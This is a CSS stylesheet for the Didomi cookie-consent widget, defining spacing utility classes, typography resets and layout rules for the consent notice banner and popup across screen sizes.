      button span {
        padding-left: initial;
        padding-top: initial;
        padding-right: initial;
        padding-bottom: initial;
        background: initial;
        height: initial;
      }
      #didomi-host {
        display: block;
        width: 0;
        height: 0;
        font-size: 15px;
        line-height: 160%;
        text-rendering: optimizeLegibility;
        -webkit-font-smoothing: antialiased;
      }
      #didomi-host .pad {
        padding: 16px;
      }
      #didomi-host .pad-xxl {
        padding: 56px;
      }
      #didomi-host .pad-xl {
        padding: 48px;
      }
      #didomi-host .pad-lg {
        padding: 32px;
      }
      #didomi-host .pad-md {
        padding: 24px;
      }
      #didomi-host .pad-sm {
        padding: 8px;
      }
      #didomi-host .pad-xs {
        padding: 4px;
      }
      #didomi-host .pad-none {
        padding: 0px;
      }
      #didomi-host .pad-bottom {
        padding-bottom: 16px;
      }
      #didomi-host .pad-bottom-xxl {
        padding-bottom: 56px;
      }
      #didomi-host .pad-bottom-xl {
        padding-bottom: 48px;
      }
      #didomi-host .pad-bottom-lg {
        padding-bottom: 32px;
      }
      #didomi-host .pad-bottom-md {
        padding-bottom: 24px;
      }
      #didomi-host .pad-bottom-sm {
        padding-bottom: 8px;
      }
      #didomi-host .pad-bottom-xs {
        padding-bottom: 4px;
      }
      #didomi-host .pad-bottom-none {
        padding-bottom: 0px;
      }
      #didomi-host .pad-top {
        padding-top: 16px;
      }
      #didomi-host .pad-top-xxl {
        padding-top: 56px;
      }
      #didomi-host .pad-top-xl {
        padding-top: 48px;
      }
      #didomi-host .pad-top-lg {
        padding-top: 32px;
      }
      #didomi-host .pad-top-md {
        padding-top: 24px;
      }
      #didomi-host .pad-top-sm {
        padding-top: 8px;
      }
      #didomi-host .pad-top-xs {
        padding-top: 4px;
      }
      #didomi-host .pad-top-none {
        padding-top: 0px;
      }
      #didomi-host .pad-left {
        padding-left: 16px;
      }
      #didomi-host .pad-left-xxl {
        padding-left: 56px;
      }
      #didomi-host .pad-left-xl {
        padding-left: 48px;
      }
      #didomi-host .pad-left-lg {
        padding-left: 32px;
      }
      #didomi-host .pad-left-md {
        padding-left: 24px;
      }
      #didomi-host .pad-left-sm {
        padding-left: 8px;
      }
      #didomi-host .pad-left-xs {
        padding-left: 4px;
      }
      #didomi-host .pad-left-none {
        padding-left: 0px;
      }
      #didomi-host .pad-right {
        padding-right: 16px;
      }
      #didomi-host .pad-right-xxl {
        padding-right: 56px;
      }
      #didomi-host .pad-right-xl {
        padding-right: 48px;
      }
      #didomi-host .pad-right-lg {
        padding-right: 32px;
      }
      #didomi-host .pad-right-md {
        padding-right: 24px;
      }
      #didomi-host .pad-right-sm {
        padding-right: 8px;
      }
      #didomi-host .pad-right-xs {
        padding-right: 4px;
      }
      #didomi-host .pad-right-none {
        padding-right: 0px;
      }
      #didomi-host .pull-xxl {
        margin: -56px;
      }
      #didomi-host .pull-xl {
        margin: -48px;
      }
      #didomi-host .pull-lg {
        margin: -32px;
      }
      #didomi-host .pull-md {
        margin: -24px;
      }
      #didomi-host .pull {
        margin: -16px;
      }
      #didomi-host .pull-sm {
        margin: -8px;
      }
      #didomi-host .pull-xs {
        margin: -4px;
      }
      #didomi-host .pull-none {
        margin: 0px;
      }
      #didomi-host .pull-bottom-xxl {
        margin-bottom: -56px;
      }
      #didomi-host .pull-bottom-xl {
        margin-bottom: -48px;
      }
      #didomi-host .pull-bottom-lg {
        margin-bottom: -32px;
      }
      #didomi-host .pull-bottom-md {
        margin-bottom: -24px;
      }
      #didomi-host .pull-bottom {
        margin-bottom: -16px;
      }
      #didomi-host .pull-bottom-sm {
        margin-bottom: -8px;
      }
      #didomi-host .pull-bottom-xs {
        margin-bottom: -4px;
      }
      #didomi-host .pull-bottom-none {
        margin-bottom: 0px;
      }
      #didomi-host .pull-top-xxl {
        margin-top: -56px;
      }
      #didomi-host .pull-top-xl {
        margin-top: -48px;
      }
      #didomi-host .pull-top-lg {
        margin-top: -32px;
      }
      #didomi-host .pull-top-md {
        margin-top: -24px;
      }
      #didomi-host .pull-top {
        margin-top: -16px;
      }
      #didomi-host .pull-top-sm {
        margin-top: -8px;
      }
      #didomi-host .pull-top-xs {
        margin-top: -4px;
      }
      #didomi-host .pull-top-none {
        margin-top: 0px;
      }
      #didomi-host .pull-left-xxl {
        margin-left: -56px;
      }
      #didomi-host .pull-left-xl {
        margin-left: -48px;
      }
      #didomi-host .pull-left-lg {
        margin-left: -32px;
      }
      #didomi-host .pull-left-md {
        margin-left: -24px;
      }
      #didomi-host .pull-left {
        margin-left: -16px;
      }
      #didomi-host .pull-left-sm {
        margin-left: -8px;
      }
      #didomi-host .pull-left-xs {
        margin-left: -4px;
      }
      #didomi-host .pull-left-none {
        margin-left: 0px;
      }
      #didomi-host .pull-right-xxl {
        margin-right: -56px;
      }
      #didomi-host .pull-right-xl {
        margin-right: -48px;
      }
      #didomi-host .pull-right-lg {
        margin-right: -32px;
      }
      #didomi-host .pull-right-md {
        margin-right: -24px;
      }
      #didomi-host .pull-right {
        margin-right: -16px;
      }
      #didomi-host .pull-right-sm {
        margin-right: -8px;
      }
      #didomi-host .pull-right-xs {
        margin-right: -4px;
      }
      #didomi-host .pull-right-none {
        margin-right: 0px;
      }
      #didomi-host .push {
        margin: 16px;
      }
      #didomi-host .push-xxl {
        margin: 56px;
      }
      #didomi-host .push-xl {
        margin: 48px;
      }
      #didomi-host .push-lg {
        margin: 32px;
      }
      #didomi-host .push-md {
        margin: 24px;
      }
      #didomi-host .push-sm {
        margin: 8px;
      }
      #didomi-host .push-xs {
        margin: 4px;
      }
      #didomi-host .push-none {
        margin: 0px;
      }
      #didomi-host .push-bottom {
        margin-bottom: 16px;
      }
      #didomi-host .push-bottom-xxl {
        margin-bottom: 56px;
      }
      #didomi-host .push-bottom-xl {
        margin-bottom: 48px;
      }
      #didomi-host .push-bottom-lg {
        margin-bottom: 32px;
      }
      #didomi-host .push-bottom-md {
        margin-bottom: 24px;
      }
      #didomi-host .push-bottom-sm {
        margin-bottom: 8px;
      }
      #didomi-host .push-bottom-xs {
        margin-bottom: 4px;
      }
      #didomi-host .push-bottom-none {
        margin-bottom: 0px;
      }
      #didomi-host .push-top {
        margin-top: 16px;
      }
      #didomi-host .push-top-xxl {
        margin-top: 56px;
      }
      #didomi-host .push-top-xl {
        margin-top: 48px;
      }
      #didomi-host .push-top-lg {
        margin-top: 32px;
      }
      #didomi-host .push-top-md {
        margin-top: 24px;
      }
      #didomi-host .push-top-sm {
        margin-top: 8px;
      }
      #didomi-host .push-top-xs {
        margin-top: 4px;
      }
      #didomi-host .push-top-none {
        margin-top: 0px;
      }
      #didomi-host .push-left {
        margin-left: 16px;
      }
      #didomi-host .push-left-xxl {
        margin-left: 56px;
      }
      #didomi-host .push-left-xl {
        margin-left: 48px;
      }
      #didomi-host .push-left-lg {
        margin-left: 32px;
      }
      #didomi-host .push-left-md {
        margin-left: 24px;
      }
      #didomi-host .push-left-sm {
        margin-left: 8px;
      }
      #didomi-host .push-left-xs {
        margin-left: 4px;
      }
      #didomi-host .push-left-none {
        margin-left: 0px;
      }
      #didomi-host .push-right {
        margin-right: 16px;
      }
      #didomi-host .push-right-xxl {
        margin-right: 56px;
      }
      #didomi-host .push-right-xl {
        margin-right: 48px;
      }
      #didomi-host .push-right-lg {
        margin-right: 32px;
      }
      #didomi-host .push-right-md {
        margin-right: 24px;
      }
      #didomi-host .push-right-sm {
        margin-right: 8px;
      }
      #didomi-host .push-right-xs {
        margin-right: 4px;
      }
      #didomi-host .push-right-none {
        margin-right: 0px;
      }
      #didomi-host p,
      #didomi-host span,
      #didomi-host a {
        font-size: inherit;
        color: inherit;
        font-weight: inherit;
        line-height: inherit;
        text-rendering: optimizeLegibility;
        -webkit-font-smoothing: antialiased;
      }
      #didomi-host .didomi-icon {
        vertical-align: middle;
      }
      #didomi-host .didomi-logo-icon {
        margin-left: 10px;
      }
      #didomi-host div {
        display: block;
      }
      #didomi-host p {
        display: block;
        margin-bottom: 16px;
      }
      #didomi-host .p-title {
        font-weight: bold;
        font-size: 1.1em;
        display: block;
        letter-spacing: 0.005em;
      }
      #didomi-host ul {
        display: block;
        margin-bottom: 16px;
      }
      #didomi-host li {
        display: list-item;
        margin-left: 20px;
      }
      #didomi-host ol {
        display: block;
        list-style-type: decimal;
        margin-bottom: 16px;
      }
      #didomi-host table {
        box-sizing: border-box;
        display: table;
        width: 100%;
        max-width: 100%;
        border-collapse: separate;
        border-spacing: 2px;
      }
      #didomi-host table thead,
      #didomi-host table tbody {
        display: table-header-group;
      }
      #didomi-host table tr {
        display: table-row;
      }
      #didomi-host table th,
      #didomi-host table td {
        display: table-cell;
      }
      #didomi-host a {
        cursor: pointer;
      }
      #didomi-host a.didomi-no-link-style {
        text-decoration: none;
        color: #000;
      }
      #didomi-host style {
        display: none;
      }
      #didomi-host .text-bold {
        font-weight: bold;
      }
      #didomi-host h1 {
        display: block;
        font-size: 2em;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host h2 {
        display: block;
        font-size: 1.5em;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host h3 {
        display: block;
        font-size: 1.17em;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host h4 {
        display: block;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host h5 {
        display: block;
        font-size: 0.83em;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host h6 {
        display: block;
        font-size: 0.67em;
        font-weight: bold;
        margin-bottom: 16px;
      }
      #didomi-host b,
      #didomi-host strong {
        font-weight: bold;
      }
      #didomi-host i,
      #didomi-host cite,
      #didomi-host em,
      #didomi-host var,
      #didomi-host dfn {
        font-style: italic;
      }
      #didomi-host u,
      #didomi-host ins {
        text-decoration: underline;
      }
      #didomi-host s,
      #didomi-host strike,
      #didomi-host del {
        text-decoration: line-through;
      }
      #didomi-host sub {
        vertical-align: sub;
        font-size: smaller;
        line-height: normal;
      }
      #didomi-host sup {
        vertical-align: super;
        font-size: smaller;
        line-height: normal;
      }
      #didomi-host nobr {
        white-space: nowrap;
      }
      #didomi-host hr {
        display: block;
        border: 1px inset;
        margin: 16px 0;
        color: gray;
        box-sizing: content-box;
      }
      #didomi-host *:focus {
        outline: #4d90fe auto 1px;
      }
      #didomi-host li[title] span {
        cursor: help;
        border-bottom: 1px dashed #000;
      }
      #didomi-host span[title] {
        cursor: help;
        border-bottom: 1px dashed #000;
      }
      #didomi-host .hbb-safe-area {
        position: absolute;
        left: 128px;
        top: 36px;
        width: 1024px;
        height: 648px;
        background-color: rgba(0, 0, 0, 0.5);
      }
      #didomi-host [dataTooltip] {
        position: relative;
        width: -webkit-fit-content;
        width: -moz-fit-content;
        width: fit-content;
        cursor: help;
        border-bottom: 1px dashed #000;
      }
      #didomi-host [dataTooltip]:focus {
        outline: none !important;
      }
      [dir="rtl"] #didomi-host [dataTooltip]::after {
        text-align: right;
      }
      #didomi-host [dataTooltip]:focus::after {
        content: attr(dataTooltip);
        padding: 5px;
        font-size: 10px;
        line-height: 12px;
        display: block;
        position: absolute;
        white-space: pre-line;
        text-align: left;
        background-color: #f1f0f1;
        border: 1px solid #ddd;
        overflow-y: auto !important;
        max-height: 80px;
        z-index: 1;
      }
      #didomi-host .didomi-consent-popup-vendor__description [dataTooltip],
      #didomi-host .didomi-consent-popup-categories [dataTooltip],
      #didomi-host .didomi-vendor-storage-disclosures [dataTooltip] {
        position: initial;
      }
      #didomi-host .didomi-consent-popup-vendor__description [dataTooltip]:focus::after,
      #didomi-host .didomi-consent-popup-categories [dataTooltip]:focus::after,
      #didomi-host .didomi-vendor-storage-disclosures [dataTooltip]:focus::after {
        position: initial;
      }
      #didomi-host .sr-only {
        border: 0 !important;
        clip: rect(1px, 1px, 1px, 1px) !important;
        -webkit-clip-path: inset(50%) !important;
        clip-path: inset(50%) !important;
        height: 1px !important;
        margin: -1px !important;
        overflow: hidden !important;
        padding: 0 !important;
        position: fixed !important;
        width: 1px !important;
        white-space: nowrap !important;
      }
      #didomi-host [role="tooltip"],
      #didomi-host .hidetooltip.hidetooltip.hidetooltip + [role="tooltip"] {
        visibility: hidden;
        position: fixed;
      }
      #didomi-host .didomi-vendor-purpose-description {
        margin: 10px;
        border-radius: 4px;
        background: #f8f8f8;
        display: flex;
        padding: 8px 16px;
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
        align-self: stretch;
      }
      #didomi-host .didomi-vendor-purpose-description.tcfv_2_2 {
        font-size: 12px;
      }
      #didomi-host #buttons #didomi-notice-learn-more-button > span {
        white-space: normal;
      }
      #didomi-host #notice-vendors-number-section {
        display: flex;
        justify-content: end;
        align-items: center;
        color: #05687b;
      }
      #didomi-host .didomi-vendors-count-view-vendors-list-link {
        cursor: pointer;
        display: flex;
        height: 25px;
        padding: 5px 15px;
        justify-content: center;
        align-items: center;
        gap: 7px;
        border: 1px solid #ebebeb;
        background: #fff;
        font-size: 12px;
        color: #6a6a6a;
        font-weight: 700;
        padding: 5px 15px;
        line-height: 17px;
        margin-left: 10px;
      }
      #didomi-host #didomi-notice {
        background-color: #fff;
      }
      #didomi-host #didomi-notice p {
        margin: 0px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice {
        position: fixed;
        font-size: 13px;
        line-height: 1.5em;
        z-index: 2147483640;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
        margin-right: 40px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice a {
        color: inherit;
        text-decoration: underline;
      }
      #didomi-host #didomi-notice.didomi-regular-notice .didomi-notice-view-partners-link,
      #didomi-host #didomi-notice.didomi-regular-notice .didomi-notice-view-partners-link-in-text {
        text-decoration: underline;
      }
      #didomi-host #didomi-notice.didomi-regular-notice .didomi-buttons-with-x-button {
        margin-top: 36px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        padding: 32px;
        max-width: 310px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons {
        margin-top: 20px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.single {
        width: 100%;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.single button {
        width: 100%;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.multiple {
        width: 100%;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box #buttons.multiple button {
        padding-right: 0.8em;
        width: 100%;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box.top.left {
        margin: 1em 0 0 1em;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box.top.right {
        margin: 1em 1em 0 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box.bottom.left {
        margin: 0 0 1em 1em;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-box.bottom.right {
        margin: 0 1em 1em 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-banner {
        padding: 1em 1.8em;
        left: 0;
        right: 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-banner .didomi-notice__interior-border {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: justify;
        -moz-justify-content: space-between;
        justify-content: space-between;
        -moz-align-items: center;
        align-items: center;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple {
        -ms-flex: 0 0 auto;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-banner #buttons.multiple button {
        margin-right: 10px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel {
        max-width: 600px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.right {
        right: 100px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.left {
        left: 100px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.bottom {
        padding: 1px;
        border-top-width: 1px;
        border-top-style: solid;
        border-right-width: 1px;
        border-right-style: solid;
        border-left-width: 1px;
        border-left-style: solid;
        border-top-left-radius: 5px;
        border-top-right-radius: 5px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.bottom .didomi-notice__interior-border {
        border-top-width: 1px;
        border-top-style: solid;
        border-right-width: 1px;
        border-right-style: solid;
        border-left-width: 1px;
        border-left-style: solid;
        border-top-left-radius: 3px;
        border-top-right-radius: 3px;
        padding: 10px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.top {
        padding: 1px;
        border-bottom-width: 1px;
        border-bottom-style: solid;
        border-right-width: 1px;
        border-right-style: solid;
        border-left-width: 1px;
        border-left-style: solid;
        border-bottom-left-radius: 5px;
        border-bottom-right-radius: 5px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel.top .didomi-notice__interior-border {
        border-bottom-width: 1px;
        border-bottom-style: solid;
        border-right-width: 1px;
        border-right-style: solid;
        border-left-width: 1px;
        border-left-style: solid;
        border-bottom-left-radius: 3px;
        border-bottom-right-radius: 3px;
        padding: 10px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel #buttons.multiple {
        margin-top: 20px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.shape-panel #buttons.multiple button {
        margin-right: 10px;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.top {
        top: 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.bottom {
        bottom: 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.left {
        left: 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice.right {
        right: 0;
      }
      #didomi-host #didomi-notice.didomi-regular-notice #buttons {
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: row;
        flex-direction: row;
        -webkit-flex-pack: center;
        -moz-justify-content: center;
        justify-content: center;
        -moz-align-items: center;
        align-items: center;
      }
      #didomi-host #didomi-notice.didomi-regular-notice #buttons button {
        display: block;
        padding: 0.4em 0.8em;
        font-size: 0.9em;
        font-weight: 700;
        border-width: 1px;
        border-style: solid;
        text-align: center;
        white-space: nowrap;
        min-width: 140px;
        cursor: pointer;
        text-decoration: none;
      }
      #didomi-host #didomi-notice.didomi-regular-notice #buttons button.didomi-button-standard {
        background-color: #eee;
        border: solid 1px rgba(34, 34, 34, 0.2);
        color: #555;
      }
      #didomi-host #didomi-notice.didomi-regular-notice .didomi-x-button {
        right: 8px;
        top: 8px;
      }
      [dir="rtl"] #didomi-host #didomi-notice.didomi-regular-notice .didomi-x-button {
        right: auto;
        left: 8px;
      }
      #didomi-host .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
        position: absolute;
        top: 10px !important;
        right: 35px !important;
      }
      [dir="rtl"] #didomi-host .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
        left: 35px;
        right: auto !important;
      }
      #didomi-host .didomi-screen-large #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
        max-width: 1200px;
      }
      #didomi-host .didomi-screen-xlarge #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
        max-width: 1500px;
      }
      #didomi-host .didomi-mobile .didomi-notice-text-with-x-button {
        margin-left: 36px;
        margin-top: 36px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height {
        box-sizing: border-box;
        height: auto;
        max-height: 100%;
        display: flex;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height.didomi-max-height-reached #buttons {
        box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, 0.1);
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border {
        padding: 0;
        width: 100%;
        flex: 1 0 auto;
        display: flex;
        max-height: 100vh;
        max-height: -webkit-fill-available;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border .didomi-notice-text {
        padding: 1em 1.8em;
        margin: 0;
        height: 100%;
        overflow-y: auto;
        box-sizing: border-box;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border .didomi-notice-text > *:last-child {
        margin-bottom: 20px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-support-full-height .didomi-notice__interior-border #buttons {
        flex: 1 0 auto;
        box-sizing: border-box;
        padding: 1em 1.8em 1em 1.8em;
        margin-top: 0;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice {
        left: 0;
        right: 0;
        font-size: 11px;
        padding: 1px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing {
        font-size: 12px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.didomi-regular-notice-with-data-processing .didomi-notice-text {
        margin-right: 0px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice .didomi-notice__interior-border {
        padding: 1em 1.8em;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.bottom {
        border-top-width: 1px;
        border-top-style: solid;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.bottom .didomi-notice__interior-border {
        border-top-width: 1px;
        border-top-style: solid;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.top {
        border-bottom-width: 1px;
        border-bottom-style: solid;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice.top .didomi-notice__interior-border {
        border-bottom-width: 1px;
        border-bottom-style: solid;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #text {
        width: 100%;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons {
        margin-top: 20px;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.single {
        width: 100%;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.single button {
        width: 100%;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple {
        width: 100%;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple button {
        margin-right: 10px;
        padding-right: 0.8em;
        width: 100%;
      }
      #didomi-host .didomi-mobile #didomi-notice.didomi-regular-notice #buttons.multiple button:last-child {
        margin-right: 0;
      }
      #didomi-host .didomi-mobile .didomi-banner-notice-optin-type .didomi-banner-notice-continue-without-agreeing-buttons {
        width: 100%;
      }
      #didomi-host .didomi-mobile .didomi-banner-notice-optin-type .didomi-continue-without-agreeing {
        align-self: flex-end;
        position: initial;
        margin-top: 5px;
        margin-bottom: 15px;
      }
      #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple {
        -moz-flex-direction: column;
        flex-direction: column;
      }
      #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple button {
        margin-bottom: 10px;
        margin-right: 0;
        padding-right: 0;
        width: 100%;
      }
      #didomi-host .didomi-screen-xsmall #didomi-notice.didomi-regular-notice #buttons.multiple button:last-child {
        margin-bottom: 0;
      }
      #didomi-host #notice-vendors-number-section {
        display: flex;
        justify-content: end;
        align-items: center;
        color: #05687b;
      }
      #didomi-host #notice-vendors-number-section p {
        margin: 0px;
      }
      #didomi-host .didomi-popup__backdrop {
        z-index: 2147483641;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup .didomi-popup-view {
        width: 100%;
      }
      #didomi-host .didomi-popup__backdrop.didomi-popup-with-x-button {
        padding-top: 18px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height {
        box-sizing: border-box;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100%;
        max-height: 100vh;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-exterior-border {
        border-radius: 0px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-popup-container {
        border-radius: 0px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached .didomi-popup-notice-logo-container {
        box-shadow: 0px 3px 10px -2px rgba(0, 0, 0, 0.1);
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height.didomi-max-height-reached #buttons {
        box-shadow: 0 -3px 10px -2px rgba(0, 0, 0, 0.1);
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border {
        display: inherit;
        box-sizing: border-box;
        margin: 0 auto;
        z-index: 2147483641;
        padding: 0 !important;
        max-height: 100%;
        display: flex;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container {
        flex: 1 0 auto;
        max-width: 700px;
        display: flex;
        box-sizing: border-box;
        margin: 0 auto;
        padding: 0 !important;
      }
      @media all and (-ms-high-contrast: none) {
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container *::-ms-backdrop,
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view {
          height: auto !important;
          overflow-y: auto;
        }
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container *::-ms-backdrop,
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-exterior-border {
          display: block !important;
        }
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view {
        max-height: 100vh;
        height: 100%;
        height: -moz-fit-content;
        height: fit-content;
        height: -webkit-fit-content;
        width: 100%;
        padding: 0;
        flex: 1 0 auto;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        -webkit-flex-pack: start;
        -moz-justify-content: flex-start;
        justify-content: flex-start;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view > *:first-child {
        padding-top: 50px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container {
        box-sizing: border-box;
        flex: 1 0 auto;
        z-index: 2147483640;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container .didomi-popup-notice-logo {
        margin-bottom: 30px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container {
        height: 100%;
        overflow-y: auto;
        padding: 0px 50px;
        box-sizing: border-box;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-text-container > *:last-child {
        margin-bottom: 20px;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
        box-sizing: border-box;
        padding: 20px 25px 50px 25px;
        margin-top: 0;
        flex: 1 0 auto;
      }
      #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons button:first-child {
        margin-top: 0px !important;
      }
      @media all and (-ms-high-contrast: none) {
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view *::-ms-backdrop,
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view .didomi-popup-notice-logo-container {
          flex: 1 0 0;
        }
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view *::-ms-backdrop,
        #didomi-host .didomi-popup__backdrop.didomi-notice-popup.didomi-support-full-height .didomi-exterior-border .didomi-popup-container .didomi-popup-view #buttons {
          flex: 1 0 0;
        }
      }
      #didomi-host .didomi-popup-notice {
        position: relative;
        display: -webkit-flexbox;
        display: flex;
        -moz-flex-direction: column;
        flex-direction: column;
        align-items: center;
        box-sizing: border-box;
        flex: 1;
        max-width: 600px;
        padding: 50px;
      }
      #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing {
        padding: 45px 25px !important;
        color: #333;
      }
      #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing h1 {
        text-align: left;
        margin-top: 0px;
        margin-bottom: 25px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing h1 {
        text-align: right;
      }
      #didomi-host .didomi-popup-notice.didomi-popup-notice-with-data-processing p {
        margin-top: 0px;
        margin-bottom: 10px;
      }
      #didomi-host .didomi-popup-notice.didomi-popup-notice-data-processing-list p span {
        font-size: 12px;
      }
      #didomi-host .didomi-popup-notice .didomi-popup-notice-text p {
        margin: 0px;
        font-size: 15px;
      }
      #didomi-host .didomi-popup-notice h1 {
        text-align: center;
        margin-bottom: 50px;
      }
      [dir="rtl"] #didomi-host .didomi-popup-notice h1 {
        text-align: right;
      }
